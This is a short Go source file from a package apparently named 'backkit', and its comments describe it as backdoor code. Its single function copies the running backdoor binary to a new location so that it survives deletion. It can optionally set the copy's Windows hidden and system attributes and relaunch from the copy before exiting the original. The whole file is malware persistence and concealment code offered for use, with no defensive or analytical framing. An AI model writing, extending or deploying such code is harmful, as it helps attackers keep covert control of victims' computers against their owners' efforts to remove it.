package backkit

import (
	"os"
	"syscall"
)

// Copy current backdoor file to another location to prepare for someone erasing the current file.
// If u set change as true, current backdoor exited after run copied file.
// If u set hide as true, copied file will be hid.
func AddCopyPersistence(path string, change, hide bool) error {
	currentPath, err := GetCurrentPath()
	if err != nil {
		return err
	}
	err = CopyFile(currentPath, path)
	if err != nil {
		return err
	}
	if hide {
		wideCharPath, err := syscall.UTF16PtrFromString(path)
		if err != nil {
			return err
		}
		err = syscall.SetFileAttributes(wideCharPath, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
		if err != nil {
			return err
		}
	}
	if change {
		_, err := RunExecutable(path, true)
		if err != nil {
			return err
		}
		os.Exit(0)
	}
	return nil
}
